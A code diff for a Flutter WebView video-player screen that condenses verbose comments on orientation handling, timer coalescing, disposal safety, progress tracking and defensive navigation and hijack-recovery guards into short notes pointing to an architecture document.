@@ -32,33 +32,14 @@ import 'widgets/next_episode_overlay.dart';
 import 'widgets/player_error_view.dart';
 import 'widgets/player_window_actions.dart';
 
-// ─── Injected JS ────────────────────────────────────────────────────────────
-//
-// The scripts injected into every WebView session used to live here as
-// const Dart strings (~900 lines). They moved to `assets/js/` and are
-// loaded once at app startup by `PlayerScripts.load()` (see main.dart).
-//
-// The `UserScript` list assembled from those files is built in
-// `web_view_player_config.dart` — see `WebViewPlayerConfig.buildUserScripts`
-// for the ordering rationale and platform-conditional inclusion logic.
-
 /// Full-screen WebView player.
 ///
-/// Design decisions:
-/// - **No full-body GestureDetector** — the previous swipe-to-dismiss
-///   wrapper was claiming all vertical drags in Flutter's gesture arena
-///   before the WebView could receive them, breaking internal list scrolling.
-///   Dismiss is handled by the × button and the Android back button only.
-/// - **`gestureRecognizers`** — explicitly transfers vertical drag, horizontal
-///   drag, and scale gesture ownership to the WebView so Flutter widgets
-///   above it never compete.
-/// - **`gestureNavigationEnabled: false`** — disables iOS WebView's built-in
-///   swipe-to-navigate-back, which would otherwise conflict with content
-///   that needs horizontal swiping (e.g. carousels, tab bars inside the player).
-/// - **Landscape lock** — `SystemChrome.setPreferredOrientations` is called
-///   in `initState`; `dispose` fully restores portrait + system UI.
-///   The iOS `Info.plist` already declares both landscape orientations so the
-///   lock works identically on iOS and Android.
+/// Injected JS lives in `assets/js/`, loaded at startup by
+/// `PlayerScripts.load()`; the `UserScript` list is assembled in
+/// `web_view_player_config.dart`.
+///
+/// See `docs/architecture/PLAYER.md` for gesture ownership, orientation
+/// handling, hijack recovery, and the rebuild-cost optimisations.
 class WebViewPlayerScreen extends ConsumerStatefulWidget {
   final String url;
   final MediaItem media;
@@ -93,24 +74,15 @@ class WebViewPlayerScreen extends ConsumerStatefulWidget {
 
 class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     with WidgetsBindingObserver, WindowListener {
-  /// Page-load progress as a notifier rather than setState state — only the
-  /// progress bar and the initial-load overlay need to react. Putting it in
-  /// `setState` rebuilt the entire `Scaffold > Stack` tree (including the
-  /// `InAppWebView`) on every percent during a load.
+  /// A notifier, not `setState` — only the progress bar and initial-load
+  /// overlay react. See PLAYER.md § Rebuild-cost optimisations.
   final ValueNotifier<double> _loadProgress = ValueNotifier<double>(0);
 
   bool _isNavigating = false;
 
-  /// `true` when this screen is being torn down because the user pressed
-  /// "Play Next" — i.e. we're handing off to another `/player` route.
-  ///
-  /// `dispose()` consults this to decide whether to call `_restorePortrait`.
-  /// On iOS, route transition + dispose ordering means the OLD screen's
-  /// `_restorePortrait` would otherwise queue `setPreferredOrientations`
-  /// for portrait *after* the NEW screen's `_lockLandscape` had already
-  /// queued landscape — iOS honours the most recent preference and forces
-  /// a rotation to portrait under the new player. Skipping the restore on
-  /// handoff keeps the device in landscape across episodes.
+  /// `true` while handing off to another `/player` route ("Play Next").
+  /// `dispose()` skips `_restorePortrait` when set — see PLAYER.md
+  /// § Episode handoff for the iOS rotation race this avoids.
   bool _navigatingToAnotherPlayer = false;
 
   EventBridge? _eventBridge;
@@ -125,10 +97,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   Timer? _controlsTimer;
   bool _showControls = true;
 
-  /// Last time `_resetControlsTimer` actually re-armed `_controlsTimer`
-  /// (epoch ms). Used to coalesce the per-frame pointer-event flood
-  /// (`Listener.onPointerHover` fires on every mouse move on Windows) into
-  /// at most one Timer cancel + recreate per `_kControlsTimerCoalesceMs`.
+  /// Epoch ms of the last actual re-arm. Coalesces the per-frame pointer
+  /// flood on Windows into one Timer cancel + recreate per window.
   int _lastControlsTimerResetMs = 0;
   static const int _kControlsTimerCoalesceMs = 500;
 
@@ -138,42 +108,25 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   int? _lastNextEpisodeTriggered; // episode number to avoid repeat popups
   Timer? _overlayTimer;
 
-  /// Delay between the iOS 16+ "supported orientations" relaxation call and
-  /// the actual landscape lock. Without it, the second
-  /// `setPreferredOrientations` call can land before the system has finished
-  /// committing the first, producing the *"None of the requested
-  /// orientations are supported"* runtime error.
-  ///
-  /// 50 ms has held up reliably on iPhones from XS through 15 Pro; bump this
-  /// (or switch to `addPostFrameCallback`) if the error reappears on slower
-  /// devices.
+  /// Gap between the iOS 16+ orientation relaxation call and the landscape
+  /// lock. See PLAYER.md § The iOS two-step lock.
   static const Duration _kIosOrientationCommitDelay = Duration(
     milliseconds: 50,
   );
 
-  /// Latches `true` the first time the main frame finishes loading. Once set,
-  /// any subsequent main-frame navigation is checked against the original
-  /// host base — even if `_loadProgress` has dropped to 0 because the
-  /// navigation that's being inspected is itself the redirect. Without this
-  /// latch, programmatic `location.assign('evil.com')` calls slip through
-  /// the cross-domain gate during the brief window when progress is < 100.
+  /// Latches on the first completed main-frame load. Gates the cross-domain
+  /// check — see PLAYER.md § Cross-domain main-frame guard.
   bool _initialLoadComplete = false;
 
-  /// Cached "base" of the originally requested URL's host (e.g. `example.com`
-  /// for `https://www.example.com/embed/123`). Computed once in [initState] so
-  /// every navigation check is an O(1) string compare.
-  ///
-  /// Backed by the Public Suffix List (see [HostUtils]) so multi-part TLDs
-  /// like `foo.co.uk` are handled correctly.
+  /// Registered domain of the original URL (`example.com` for
+  /// `https://www.example.com/embed/123`). PSL-backed via [HostUtils] so
+  /// multi-part TLDs work; computed once so each check is an O(1) compare.
   late final String _initialHostBase = HostUtils.registeredDomain(
     Uri.tryParse(widget.url)?.host ?? '',
   );
 
-  /// Stable cache key for [nextEpisodeForProgressProvider] — only mediaId,
-  /// mediaType, season, episode participate in `UserProgress.==`/`hashCode`,
-  /// so we don't need to allocate a new instance per build with a fresh
-  /// `DateTime.now()`. Hoisted into a field to remove allocator pressure
-  /// from the player-chrome rebuild hot path.
+  /// Stable cache key for [nextEpisodeForProgressProvider], hoisted out of
+  /// `build` to cut allocator pressure on the chrome rebuild path.
   late final UserProgress _nextEpisodeKey = UserProgress(
     mediaId: widget.media.tmdbId.toString(),
     mediaType: 'tv',
@@ -186,72 +139,31 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     lastPlayedDate: DateTime.fromMillisecondsSinceEpoch(0),
   );
 
-  /// Cached `ProviderContainer` for use inside `dispose()`.
-  ///
-  /// Riverpod 3.x throws
-  /// `Bad state: Using "ref" when a widget is about to or has been unmounted`
-  /// if `ref` is touched during `dispose()` — `ref` depends on
-  /// `BuildContext`, which is being deactivated. The framework's own
-  /// error message points to the fix: cache the `ProviderContainer` in a
-  /// field while the widget is still active and call `.invalidate(...)`
-  /// on it directly.
-  ///
-  /// Captured in `initState` with `listen: false` so we don't register an
-  /// InheritedWidget dependency that would cause `didChangeDependencies`
-  /// to fire (and re-assign a `late final` — the previous source of the
-  /// `LateInitializationError`).
+  /// Cached in `initState` so `dispose()` can invalidate providers without
+  /// touching `ref` — Riverpod 3.x throws once the element starts
+  /// unmounting. `listen: false` avoids registering a dependency that
+  /// would fire `didChangeDependencies`.
   late final ProviderContainer _providerContainer;
 
-  /// Latched in [dispose] before `super.dispose()` runs. Used by every
-  /// WebView callback that the native side can fire after we've torn down
-  /// — `shouldOverrideUrlLoading`, `shouldInterceptRequest`,
-  /// `onProgressChanged` — to bail out before touching `ref`,
-  /// `_loadProgress`, or any other field whose lifetime is tied to the
-  /// State. `mounted` flips false only after `super.dispose()` returns,
-  /// which is too late for the Windows path where `_cleanupWebView`
-  /// deliberately skips `stopLoading()`.
+  /// Latched at the top of [dispose]. WebView callbacks the native side can
+  /// still fire during teardown check this — `mounted` only flips after
+  /// `super.dispose()` returns, which is too late on Windows.
   bool _disposed = false;
 
-  // ─── Gesture recognizers — transferred to the WebView ────────────────────
-  // Giving explicit ownership of these gestures to the WebView prevents the
-  // Flutter widget tree from competing, which is the root cause of scroll
-  // breakage in embedded lists.
-  // NOTE: LongPressGestureRecognizer was intentionally removed — it causes
-  // a ~500 ms delay in the gesture arena before taps are forwarded to the
-  // WebView, making buttons appear to require a "double click" to interact.
+  // LongPressGestureRecognizer is deliberately NOT transferred to the
+  // WebView — it adds a ~500 ms gesture-arena delay before taps forward,
+  // making buttons feel like they need a double click.
   @override
   void initState() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
 
-    // Cache the ProviderContainer NOW (widget is mounted, context is
-    // active) so dispose() can call .invalidate() without touching `ref`.
-    // `listen: false` uses `getElementForInheritedWidgetOfExactType` under
-    // the hood, which — unlike `dependOnInheritedWidgetOfExactType` — is
-    // safe in `initState` and doesn't register a dependency that would
-    // make `didChangeDependencies` fire later.
     _providerContainer = ProviderScope.containerOf(context, listen: false);
 
-    // Fail-closed at construction. Three checks:
-    //
-    //   1. The URI must parse.
-    //   2. The scheme MUST be http or https. Without this, a hostile or
-    //      tampered plugin manifest (e.g. one imported via
-    //      ExportImportService from an untrusted `.spovies` backup) could
-    //      hand us `intent://...` / `content://...` / `file://...` /
-    //      `javascript:...` URIs. `InAppWebView.initialUrlRequest` loads
-    //      them directly — `shouldOverrideUrlLoading` is NOT consulted for
-    //      the initial URL on Android — so without this gate the scheme
-    //      block list further down only protects *subsequent* navigations.
-    //   3. The host must be non-empty. Otherwise the cross-domain
-    //      navigation guard at the bottom of `shouldOverrideUrlLoading`
-    //      silently disables itself and any cross-frame redirect slips
-    //      through.
-    //
-    // The install path (`PluginManifestModel.fromJson` →
-    // `UrlValidator.validateUrlTemplate`) already rejects non-http(s)
-    // schemes; this is the defence-in-depth that catches anything that
-    // gets here regardless.
+    // Fail closed: the URI must parse, use http(s), and have a host.
+    // `initialUrlRequest` bypasses `shouldOverrideUrlLoading` on Android,
+    // and an empty host silently disables the cross-domain guard below.
+    // Defence-in-depth — the install path validates this too.
     final initialUri = Uri.tryParse(widget.url);
     final initialScheme = initialUri?.scheme.toLowerCase() ?? '';
     final initialHost = initialUri?.host ?? '';
@@ -275,19 +187,13 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
     _eventBridge = EventBridge(onProgressUpdate: _onProgressUpdate);
     if (PlayerPlatform.isWindows) {
-      // Subscribe to window-manager events so F11 / native chrome
-      // fullscreen toggles update `_isFullScreen` — previously this
-      // state desynced whenever the user toggled fullscreen outside our
-      // own `_toggleFullScreen` button.
+      // Keeps `_isFullScreen` in sync when the user toggles fullscreen
+      // outside our own button (F11, title-bar double-click, OS shortcut).
       windowManager.addListener(this);
       _checkFullScreen();
     }
     _resetControlsTimer();
   }
-
-  // ── WindowListener (Windows only) ────────────────────────────────────────
-  // Mixin methods default to no-op; we override only the two events we care
-  // about. These fire on F11, double-click title-bar, and the OS shortcuts.
 
   @override
   void onWindowEnterFullScreen() {
@@ -302,16 +208,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
     super.didChangeAppLifecycleState(state);
-    // The WebView's JS bridge only forwards a `pause` event when the
-    // streaming provider's <video> element itself fires `pause` — that's
-    // unreliable across plugins (HLS.js wrappers, custom MSE, etc.). When
-    // the OS sends us to the background we flush the Continue Watching row
-    // ourselves so the Home screen reflects the latest saved progress on
-    // the way back in.
-    //
-    // Uses the cached `_providerContainer` — same rationale as in dispose:
-    // the lifecycle callback can race with widget deactivation, and `ref`
-    // throws once the BuildContext is unmounted.
+    // Plugins fire `pause` unreliably (HLS.js wrappers, custom MSE), so
+    // flush Continue Watching ourselves when the OS backgrounds us.
     if ((state == AppLifecycleState.paused ||
             state == AppLifecycleState.inactive ||
             state == AppLifecycleState.hidden) &&
@@ -325,11 +223,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   void _resetControlsTimer() {
     if (!mounted) return;
 
-    // The hot path: pointer move + JS user-activity events fire continuously.
-    // The JS bridge already throttles to 500 ms, but we still get pointer
-    // moves on every frame on Windows/desktop. Only call setState when
-    // something actually needs to change — otherwise we're scheduling an
-    // entire rebuild of the player chrome on every mouse twitch.
+    // Hot path — pointer moves fire every frame on desktop. Only setState
+    // when something actually changes.
     final overlayShouldShow =
         _showNextEpisodeOverlay && !_dismissedNextEpisodeOverlay;
     final overlayNeedsUpdate = overlayShouldShow && !_overlayActive;
@@ -344,11 +239,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       });
     }
 
-    // Coalesce Timer churn — the previous implementation cancelled and
-    // re-created a 5 s Timer on every pointer event, which on Windows
-    // fires once per frame (~60 Hz) while the mouse moves. Re-arm at
-    // most once per _kControlsTimerCoalesceMs; the 5 s controls-hide
-    // delay then slips by at most that interval after the user stops.
+    // Coalesce Timer churn — re-arm at most once per window.
     final now = DateTime.now().millisecondsSinceEpoch;
     if (now - _lastControlsTimerResetMs < _kControlsTimerCoalesceMs) return;
     _lastControlsTimerResetMs = now;
@@ -371,10 +262,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   Future<void> _checkFullScreen() async {
     final isFullscreen = await windowManager.isFullScreen();
     if (!mounted) return;
-    // The WindowListener (registered just above this call in initState)
-    // may have already updated `_isFullScreen` while this await was
-    // suspended — e.g. the user hit F11 externally. Don't clobber the
-    // listener's value: only push state if it would actually change.
+    // The WindowListener may have updated `_isFullScreen` during the await.
+    // Only push state if it would actually change.
     if (_isFullScreen != isFullscreen) {
       setState(() => _isFullScreen = isFullscreen);
     }
@@ -382,9 +271,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   @override
   void dispose() {
-    // Latch FIRST so any in-flight WebView callback that fires between
-    // here and `super.dispose()` short-circuits (mounted stays true until
-    // super.dispose() returns).
+    // Latch FIRST so in-flight WebView callbacks short-circuit.
     _disposed = true;
     WidgetsBinding.instance.removeObserver(this);
     if (PlayerPlatform.isWindows) {
@@ -393,25 +280,15 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     _controlsTimer?.cancel();
     _overlayTimer?.cancel();
     _cleanupWebView();
-    // Break the retain cycle — the bridge closes over `_onProgressUpdate`
-    // which captures `this`. A nulled reference lets the GC reclaim both
-    // the bridge and any pending callback chain.
+    // Break the retain cycle — the bridge captures `this`.
     _eventBridge = null;
     _loadProgress.dispose();
-    // If progress was written during this session but never flushed via a
-    // pause/ended event (e.g. the user just closed the player), refresh
-    // the Continue Watching row once on the way out.
-    //
-    // Use the cached `_providerContainer` directly — `ref.invalidate(...)`
-    // here throws `Bad state: Using "ref" when a widget is about to or has
-    // been unmounted is unsafe` in Riverpod 3.x because `ref` depends on
-    // the deactivating BuildContext.
+    // Flush progress written this session but never committed by a
+    // pause/ended event.
     if (_progressDirty) {
       _providerContainer.invalidate(continueWatchingProvider);
       _providerContainer.invalidate(episodeProgressProvider);
     }
-    // Skip the orientation restore when handing off to another player —
-    // see [_navigatingToAnotherPlayer] for the iOS race this avoids.
     if (!_navigatingToAnotherPlayer) {
       _restorePortrait();
     }
@@ -423,26 +300,20 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   void _cleanupWebView() {
     final controller = _controller;
     if (controller != null) {
-      // Drop the JS handler BEFORE nulling the controller reference.
-      // The callback closure registered in `onWebViewCreated` captures
-      // `this` (through `_eventBridge` and `_resetControlsTimer`), so
-      // leaving the handler attached pins the State alive for as long as
-      // the native controller exists. On Windows WebView2 the native
-      // controller can outlive the Flutter platform view, so a leaked
-      // handler leaks one State per playback.
+      // Drop the handler BEFORE nulling the controller — its closure
+      // captures `this`, and on Windows the native controller can outlive
+      // the platform view, leaking one State per playback.
       try {
         controller.removeJavaScriptHandler(handlerName: 'spoviesEventBridge');
       } catch (e) {
-        // `removeJavaScriptHandler` can throw on Windows during
-        // transitional WebView2 states (same root cause as the
-        // E_INVALIDARG we already handle in `_recoverFromHijack`). The
-        // controller is about to be released anyway — log and move on.
+        // Throws on Windows during transitional WebView2 states. The
+        // controller is about to be released anyway.
         if (kDebugMode) {
           debugPrint('Player: removeJavaScriptHandler failed: $e');
         }
       }
-      // Windows is sensitive to imperative calls during disposal transitions.
-      // We nullify the reference and let the native platform view dispose itself.
+      // Windows is sensitive to imperative calls during disposal — let the
+      // native platform view dispose itself.
       if (!PlayerPlatform.isWindows) {
         controller.stopLoading();
       }
@@ -450,50 +321,11 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     }
   }
 
-  // ─── Hijack recovery ─────────────────────────────────────────────────────
+  // ─── Hijack recovery (Windows/WebView2 only) ─────────────────────────────
   //
-  // Used by two different streaming-page attacks that bypass our normal
-  // navigation guards on Windows WebView2:
-  //
-  //   1. `about:blank` click-jacker — overlay anchor on the embed page,
-  //      detected at `onUpdateVisitedHistory`. WebView2 skips
-  //      `shouldOverrideUrlLoading` AND `onLoadStart` for the synthetic
-  //      main-frame navigation that fires after `onCreateWindow` rejects
-  //      a `target="_blank"` anchor with `hasGesture: true`, so
-  //      `onUpdateVisitedHistory` is the earliest signal.
-  //   2. Microsoft Defender SmartScreen takeover — embed page server-side
-  //      redirects to an ad domain SmartScreen has flagged, replacing the
-  //      whole player with a red warning. Detected at `onTitleChanged`.
-  //
-  // Both signals fire only on Windows (WebView2). Both recoveries do the
-  // same thing: stop the load, then `goBack()` (preserves embed-page
-  // state) or `loadUrl(widget.url)` (fallback).
-  //
-  // Two layers of rate-limiting:
-  //
-  //   • Per-type cooldown (`_kRecoveryCooldown`, 2 s) — debounces tight
-  //     re-entry of the SAME signal. SmartScreen fires `onTitleChanged`
-  //     multiple times for the same warning; about:blank fires several
-  //     `onUpdateVisitedHistory` callbacks during the transition. The
-  //     cooldown is keyed by recovery type so an about:blank recovery
-  //     does NOT silence the SmartScreen recovery that fires
-  //     milliseconds later for the same root incident (Provider D → bad
-  //     redirect → both signals fire together).
-  //
-  //   • Circuit breaker — true sliding window over the last
-  //     `_kRecoveryWindowDuration`. We track each recovery's timestamp
-  //     in `_recentRecoveries`; on every call we drop stale entries
-  //     and trip the breaker when the live count crosses
-  //     `_kMaxRecoveriesPerWindow`. This protects against backends like
-  //     `example.com` that 522 + redirect to an
-  //     ad SmartScreen flags in a loop — after 3 attempts in 15 s we
-  //     surface an error and let the user pick a different plugin.
-  //     Counter is GLOBAL across types so a fast-cycling Provider D page
-  //     that trips BOTH signals on each load still escalates to the
-  //     error after 3 round-trips. Failed controller calls (E_INVALIDARG
-  //     during transitional WebView2 states) roll back their entry so
-  //     they don't silently burn the breaker budget without actually
-  //     recovering anything.
+  // Handles the about:blank click-jacker and the SmartScreen takeover.
+  // Rate-limited by a per-type cooldown plus a global sliding-window
+  // circuit breaker. See `docs/architecture/PLAYER.md` § Hijack recovery.
   final Map<String, DateTime> _lastRecoveryByType = {};
   final List<DateTime> _recentRecoveries = [];
   static const Duration _kRecoveryCooldown = Duration(seconds: 2);
@@ -515,10 +347,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       return;
     }
 
-    // Sliding-window prune: drop entries older than the window. This is
-    // the difference from the previous fixed-window implementation that
-    // would lock the user out at a healthy long-term recovery rate when
-    // recoveries clustered just inside the original window.
+    // Sliding-window prune — drop entries older than the window.
     _recentRecoveries.removeWhere(
       (t) => now.difference(t) > _kRecoveryWindowDuration,
     );
@@ -551,18 +380,13 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       );
     }
 
-    // Wrap every native controller call in try/catch — flutter_inappwebview's
-    // Windows C++ side has been observed throwing `E_INVALIDARG` (0x80070057)
-    // at `in_app_webview.cpp:1231` when stopLoading/goBack/loadUrl run during
-    // a transitional WebView2 state. We don't want those to leak as
-    // unhandled async errors.
+    // Native calls throw E_INVALIDARG on Windows during transitional
+    // WebView2 states; don't let those leak as unhandled async errors.
     try {
       await controller.stopLoading();
       if (!mounted) return;
-      // Prefer goBack() — WebView2's history still has the embed page, so
-      // the previous page state (server selection, video element) is
-      // preserved. Fall back to a fresh load only if there's nothing to
-      // go back to.
+      // Prefer goBack() — WebView2's history still holds the embed page, so
+      // server selection and video element state survive.
       final canGoBack = await controller.canGoBack();
       if (!mounted) return;
       if (canGoBack) {
@@ -576,13 +400,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       if (kDebugMode) {
         debugPrint('Player: recovery controller call failed: $e\n$st');
       }
-      // The native call failed — likely WebView2 was mid-transition.
-      // Roll back the recovery entry we recorded above. Without the
-      // rollback, a sequence of failed controller calls (each from a
-      // recurring transitional state) would silently burn the breaker
-      // budget without performing any real recovery, and the user
-      // would see the "try a different plugin" error even though we
-      // never managed to attempt a recovery.
+      // Roll back the entry — a failed call must not burn breaker budget
+      // without having actually attempted a recovery.
       if (_recentRecoveries.isNotEmpty && _recentRecoveries.last == now) {
         _recentRecoveries.removeLast();
       }
@@ -592,22 +411,19 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   // ─── Orientation ─────────────────────────────────────────────────────────
 
   Future<void> _lockLandscape() async {
-    // Orientation lock and immersive mode are mobile-only APIs.
     if (!PlayerPlatform.supportsOrientationLock) return;
 
     if (PlayerPlatform.isIOS) {
-      // First, relax the supported set so iOS 16+ doesn't reject the
-      // landscape-only call below with "None of the requested orientations
-      // are supported".
+      // Relax the supported set first — iOS 16+ rejects a landscape-only
+      // call with "None of the requested orientations are supported".
       await SystemChrome.setPreferredOrientations([
         DeviceOrientation.landscapeLeft,
         DeviceOrientation.landscapeRight,
         DeviceOrientation.portraitUp,
       ]);
       await Future.delayed(_kIosOrientationCommitDelay);
-      // After the await: if the user popped the route in this 50 ms
-      // window, the second `setPreferredOrientations` below would land on
-      // the parent screen, leaving it stuck in landscape + immersive.
+      // If the route was popped during the delay, the call below would
+      // land on the parent screen and strand it in landscape.
       if (_disposed) return;
     }
 
@@ -615,7 +431,6 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       DeviceOrientation.landscapeLeft,
       DeviceOrientation.landscapeRight,
     ]);
-    // Immersive mode: hides nav bar + status bar for full viewport.
     await SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
   }
 
@@ -630,8 +445,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   // ─── Progress Tracking ───────────────────────────────────────────────────
 
-  /// Tracks whether anything has been persisted this session so we know to
-  /// invalidate the Continue Watching list once on lifecycle events.
+  /// Whether anything was persisted this session, so lifecycle events know
+  /// to invalidate Continue Watching once.
   bool _progressDirty = false;
 
   void _onProgressUpdate(PlayerEvent event) {
@@ -652,8 +467,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       lastPluginId: widget.pluginId,
     );
 
-    // Fire-and-forget write with explicit error handling so a Hive write
-    // failure can't escape as an unhandled async error.
+    // Fire-and-forget, but handled — a Hive failure must not escape as an
+    // unhandled async error.
     unawaited(
       ref
           .read(watchHistoryRepositoryProvider)
@@ -664,10 +479,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     );
     _progressDirty = true;
 
-    // Invalidate the Continue Watching row only on pause/ended — the
-    // throttled timeupdate fires every ~5s during playback and used to
-    // rebuild the home screen continuously. The repository write above
-    // still happens every update so progress survives a crash.
+    // Only on pause/ended — the throttled timeupdate fires every ~5 s and
+    // would rebuild the home screen continuously. The write above still
+    // happens on every update, so progress survives a crash.
     final isLifecycle =
         event.eventType == 'pause' || event.eventType == 'ended';
     if (isLifecycle) {
@@ -676,11 +490,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       _progressDirty = false;
     }
 
-    // PlayerEvent.tryParse normalises progress to the 0–100 scale at the
-    // parse boundary, so we use it directly here. The previous
-    // "if (progress <= 1.0) *= 100" heuristic mis-fired at <1 % real
-    // progress (e.g. 0.83 % → 83 %) and triggered the Next-Episode
-    // overlay seconds into playback.
+    // Already normalised to 0–100 by PlayerEvent.tryParse.
     final currentEp = event.episode ?? widget.episode;
     final pct = event.progress;
 
@@ -688,10 +498,6 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       if (!_showNextEpisodeOverlay &&
           !_dismissedNextEpisodeOverlay &&
           _lastNextEpisodeTriggered != currentEp) {
-        // _lastNextEpisodeTriggered is bookkeeping (read only in this method,
-        // never in build) — assigning it inside setState is just convenient
-        // grouping with _showNextEpisodeOverlay/_overlayActive which DO drive
-        // the overlay's visibility.
         setState(() {
           _showNextEpisodeOverlay = true;
           _overlayActive = true;
@@ -700,10 +506,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
         });
       }
     } else {
-      // Reset dismissal + trigger-tracking when the user has scrubbed back
-      // far enough to "re-arm" the overlay for this episode. Neither field
-      // is read in build, so plain assignment is correct — wrapping in
-      // setState would schedule a rebuild that does nothing.
+      // Re-arm the overlay once the user scrubs back far enough. Neither
+      // field is read in build, so plain assignment is correct.
       if (pct < 90.0) {
         _dismissedNextEpisodeOverlay = false;
         _lastNextEpisodeTriggered = null;
@@ -743,10 +547,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
         loading: () => const Center(
           child: CircularProgressIndicator(color: AppColors.primary),
         ),
-        // Render the error state directly without mutating widget state during
-        // build — that would either trigger a setState-in-build assertion or
-        // permanently latch _hasError, leaving the screen stuck if the env
-        // provider later recovers. Retry simply invalidates the provider.
+        // Render directly without mutating state during build — that would
+        // trip a setState-in-build assertion or permanently latch
+        // `_hasError`, stranding the screen if the provider recovers.
         error: (err, _) => _buildErrorState(
           overrideMessage: 'WebView initialization failed: $err',
           onRetry: () => ref.invalidate(webViewEnvironmentProvider),
@@ -760,20 +563,14 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       canPop: false,
       onPopInvokedWithResult: (didPop, _) {
         if (didPop) return;
-        // System back pops one level back to wherever the player was
-        // pushed from (typically /details). Matches the history-aware
-        // contract: every full-screen route returns to its caller.
-        // [_dismiss] handles the window-manager cleanup + the actual
-        // `context.pop()`; the in-app × button uses the same path.
+        // Pops one level to whoever pushed us (usually /details).
+        // `_dismiss` also does the window-manager cleanup.
         _dismiss();
       },
       child: Scaffold(
         backgroundColor: Colors.black,
-        // A single Listener covers every pointer kind:
-        //   • onPointerDown / onPointerMove → touch + held mouse
-        //   • onPointerHover → bare mouse hover on desktop
-        // The previous MouseRegion + Listener pair duplicated every mouse
-        // event, calling _resetControlsTimer twice per frame on Windows.
+        // One Listener covers every pointer kind. A MouseRegion + Listener
+        // pair would double-fire every mouse event on Windows.
         body: Listener(
           behavior: HitTestBehavior.translucent,
           onPointerDown: (_) => _resetControlsTimer(),
@@ -812,8 +609,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               return KeyEventResult.ignored;
             }
 
-            // Ignore modifier keys to prevent Flutter's internal state tracker
-            // from getting desynchronized (fixes "Alt Left" assertion crash).
+            // Ignore modifiers — otherwise Flutter's key-state tracker
+            // desyncs and asserts on "Alt Left".
             if (event.logicalKey == LogicalKeyboardKey.altLeft ||
                 event.logicalKey == LogicalKeyboardKey.altRight ||
                 event.logicalKey == LogicalKeyboardKey.controlLeft ||
@@ -823,24 +620,21 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               return KeyEventResult.ignored;
             }
 
-            // On Windows, we must return .handled for all other keys to prevent
-            // the WebView from triggering framework assertions during layout.
-            // On other platforms (Android/iOS), we return .ignored so system
-            // and hardware keys work naturally.
+            // Windows needs .handled for everything else, or the WebView
+            // trips framework assertions during layout. Elsewhere .ignored
+            // keeps system and hardware keys working.
             return PlayerPlatform.isWindows
                 ? KeyEventResult.handled
                 : KeyEventResult.ignored;
           },
           child: InAppWebView(
-            // Full URL (not hashCode) — String hashCode collides, and a
-            // collision here causes the framework to reuse the previous
-            // WebView state for a different URL.
+            // Full URL, not hashCode — String hashCode collides, and a
+            // collision reuses the previous WebView state for a new URL.
             key: ValueKey('spovies_player_${widget.url}'),
             webViewEnvironment: environment,
             preventGestureDelay: true,
-            // Desktop platforms don't want any gesture competition with the
-            // WebView. Mobile transfers vertical/horizontal drag + scale to
-            // the WebView so embedded list scroll stays smooth.
+            // Mobile hands drag + scale to the WebView so embedded list
+            // scroll stays smooth; desktop wants no competition at all.
             gestureRecognizers: PlayerPlatform.isDesktop
                 ? const <Factory<OneSequenceGestureRecognizer>>{}
                 : <Factory<OneSequenceGestureRecognizer>>{
@@ -863,19 +657,16 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                   if (args.isEmpty || _disposed) return;
                   final rawMessage = args[0].toString();
 
-                  // Parse the JSON ONCE at the boundary instead of doing a
-                  // raw `rawMessage.contains('"type":"USER_ACTIVITY"')`
-                  // substring check. The substring match collides with any
-                  // payload that mentions the literal string in a nested
-                  // field (e.g. `data.notes = "see \"type\":\"USER_ACTIVITY\""`),
-                  // causing legitimate PLAYER_EVENTs to be silently dropped.
+                  // Parse once at the boundary. A substring check for
+                  // `"type":"USER_ACTIVITY"` collides with payloads that
+                  // mention it in a nested field, silently dropping real
+                  // PLAYER_EVENTs.
                   Map<String, dynamic>? parsed;
                   try {
                     final decoded = jsonDecode(rawMessage);
                     if (decoded is Map<String, dynamic>) parsed = decoded;
                   } catch (_) {
-                    // Non-JSON payload — let EventBridge.handleMessage
-                    // decide (it has its own try/catch for that case).
+                    // Non-JSON — EventBridge.handleMessage handles it.
                   }
                   if (parsed?['type'] == 'USER_ACTIVITY') {
                     _resetControlsTimer();
@@ -886,39 +677,18 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               );
             },
             onProgressChanged: (controller, progress) {
-              // _disposed before mounted — the WebView's native side can
